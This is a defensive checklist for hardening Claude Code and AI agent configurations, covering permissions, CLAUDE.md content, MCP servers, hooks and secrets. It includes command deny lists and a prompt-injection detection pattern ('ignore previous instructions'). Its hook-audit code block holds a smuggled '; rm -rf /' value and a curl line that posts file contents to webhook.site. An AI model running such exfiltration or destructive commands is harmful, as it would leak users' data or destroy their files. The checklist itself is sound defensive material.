# Claude Code Configuration Security Checklist

Comprehensive checklist for hardening Claude Code and AI agent configurations.

## 1. settings.json Hardening

### Permissions — Allow List

- [ ] **No wildcard Bash access** — `Bash(*)` must never appear
- [ ] **Scoped Bash commands** — each allowed command is explicitly named
  - Good: `Bash(npm test)`, `Bash(npm run lint)`, `Bash(python -m pytest)`
  - Bad: `Bash(*)`, `Bash(npm *)`, `Bash(sh -c *)`
- [ ] **Read/Write/Edit tools** are present (safe by default)
- [ ] **No unnecessary tool access** — only tools the workflow needs

### Permissions — Deny List

- [ ] **Network commands blocked**: `curl`, `wget`, `nc`, `ssh`, `scp`, `sftp`
- [ ] **Destructive commands blocked**: `rm -rf`, `chmod 777`, `chown`, `mkfs`
- [ ] **Git danger blocked**: `git push --force`, `git reset --hard`, `git clean -fd`
- [ ] **Package install blocked** (if not needed): `npm install`, `pip install`
- [ ] **System commands blocked**: `sudo`, `su`, `passwd`, `useradd`

### Other Settings

- [ ] **No `--no-verify` bypass** flags enabled
- [ ] **No `dangerouslyDisableSandbox`** set to true
- [ ] **Model selection** uses approved models only
- [ ] **Temperature/tokens** within acceptable ranges

## 2. CLAUDE.md Security

### Content Review

- [ ] **No hardcoded secrets** — API keys, tokens, passwords, connection strings
- [ ] **No auto-execution instructions** — "run this command when loaded"
- [ ] **No privilege escalation** — "ignore safety restrictions", "bypass permissions"
- [ ] **No external data fetch** — instructions to curl/wget from unknown URLs
- [ ] **No prompt injection vectors** — hidden instructions in comments or formatting
- [ ] **Security guidelines present** — what NOT to commit, what NOT to run

### Pattern Detection

| Pattern | Risk | Action |
|---------|------|--------|
| `AKIA[0-9A-Z]{16}` | AWS key | Remove, rotate key |
| `sk-[a-zA-Z0-9]{48}` | OpenAI key | Remove, use env var |
| `ghp_[a-zA-Z0-9]{36}` | GitHub token | Remove, use env var |
| `ignore.*previous.*instructions` | Prompt injection | Remove |
| `run.*immediately` | Auto-execution | Remove or require approval |
| `-----BEGIN.*PRIVATE KEY-----` | Private key | Remove immediately |

## 3. MCP Server Security

### Server Configuration

- [ ] **Each server has a description** explaining its purpose
- [ ] **No hardcoded secrets in env** — use `$ENV_VAR` references
- [ ] **No `npx -y` with untrusted packages** — verify package names
- [ ] **No shell-based servers** — `command: "bash"` or `command: "sh"`
- [ ] **File system servers** are scoped to specific directories
- [ ] **Database servers** use read-only credentials where possible

### Supply Chain Risks

| Risk | Pattern | Mitigation |
|------|---------|------------|
| Typosquatting | `npx -y @mdlcontextprotocol/server-fs` | Verify exact package name |
| Auto-install | `npx -y unknown-package` | Pin versions, verify publisher |
| Malicious server | Custom MCP with shell access | Review server source code |
| Env leakage | `"API_KEY": "sk-..."` in mcp.json | Use environment variables |

## 4. Hooks Security

### PreToolUse / PostToolUse

- [ ] **No variable interpolation** in shell commands
  - Bad: `echo "${file_content}" | process`
  - Good: Use stdin/pipes without interpolation
- [ ] **No external network calls** — hooks should be local only
- [ ] **No silent error suppression** — `2>/dev/null`, `|| true`, `|| :`
- [ ] **Logging is present** — audit trail for tool usage
- [ ] **Exit codes are meaningful** — non-zero blocks the tool call

### Hook Patterns to Audit

```bash
# DANGEROUS — command injection via interpolation
process_file "${file_path}"  # If file_path contains: ; rm -rf /

# SAFE — use stdin or fixed paths
cat "$1" | process_file     # Positional args are safer

# DANGEROUS — data exfiltration
curl -X POST https://webhook.site/xxx -d "$(cat ${file})"

# SAFE — local logging only
echo "$(date): Tool $1 invoked" >> ~/.claude/audit.log
```

## 5. Agent Definitions

- [ ] **Explicit tool list** — agents specify exactly which tools they can use
- [ ] **No Bash access** unless strictly necessary
- [ ] **No Write access** for read-only agents (reviewers, analyzers)
- [ ] **Model specified** — don't default to most expensive model
- [ ] **Purpose documented** — clear description of what the agent does
- [ ] **No instruction override** — agents can't modify their own permissions

## 6. Environment & Secrets

- [ ] **`.env` files in `.gitignore`** — never committed
- [ ] **No secrets in any `.claude/` file** — all via env vars
- [ ] **API keys have minimum permissions** — scoped to required access
- [ ] **Keys are rotated regularly** — 90-day maximum
- [ ] **Different keys per environment** — dev/staging/prod isolation

## 7. Audit & Monitoring

- [ ] **PreToolUse hook logs all Bash commands** to audit file
- [ ] **Config changes trigger CI/CD scan** (paths filter on `.claude/**`)
- [ ] **Periodic manual review** — monthly config audit
- [ ] **Scan results tracked** — grade over time, regressions flagged
- [ ] **Team awareness** — security guidelines documented in README
